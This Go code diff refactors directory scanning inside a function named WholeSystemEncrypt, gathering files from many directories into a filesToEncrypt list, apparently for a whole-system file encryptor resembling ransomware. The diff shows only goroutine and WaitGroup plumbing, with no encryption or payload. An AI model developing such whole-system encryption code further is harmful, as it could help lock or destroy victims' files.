@@ -46,33 +46,16 @@ func WholeSystemEncrypt() {
 
 	for _, dir := range dirsToScan {
 
-		// go testt(dir, &wg, chanFilesScanned)
-		go func(dir string, wg *sync.WaitGroup, chanFilesScanned chan<- []string) {
-			_, err := os.Stat(dir)
-			if err != nil {
-				if os.IsNotExist(err) {
-					fmt.Println("Dir does not exist: ", dir)
-					wg.Done()
-				}
-			} else {
-				pl("Scanning: ", dir)
-				files, size := scan.ScanNoSideEffects(dir, true)
-				//send files to channel
-				chanFilesScanned <- files
-
-				pl("Size of found files in: ", dir, " is ", humanize.Bytes(uint64(size)))
-			}
-		}(dir, &wg, chanFilesScanned)
+		go goroutineScanDir(dir, &wg, chanFilesScanned)
 
 	}
 	//listen for channel and append to filesToEncrypt
 	go func() {
-		for {
-			select {
-			case files := <-chanFilesScanned:
-				filesToEncrypt = append(filesToEncrypt, files...)
-				wg.Done()
-			}
+		for range dirsToScan {
+			files := <-chanFilesScanned
+			filesToEncrypt = append(filesToEncrypt, files...)
+			wg.Done()
+
 		}
 	}()
 
@@ -85,12 +68,13 @@ func WholeSystemEncrypt() {
 
 }
 
-func testt(dir string, wg *sync.WaitGroup, chanFilesScanned chan []string) {
+func goroutineScanDir(dir string, wg *sync.WaitGroup, chanFilesScanned chan []string) {
 
 	_, err := os.Stat(dir)
 	if err != nil {
 		if os.IsNotExist(err) {
 			fmt.Println("Dir does not exist: ", dir)
+			wg.Done()
 		}
 	} else {
 		pl("Scanning: ", dir)
@@ -100,7 +84,6 @@ func testt(dir string, wg *sync.WaitGroup, chanFilesScanned chan []string) {
 
 		pl("Size of found files in: ", dir, " is ", humanize.Bytes(uint64(size)))
 	}
-	defer wg.Done()
 }
 
 func generateListOfDirsToScan(dirsToScan []string, dirsToRemove []string) []string {
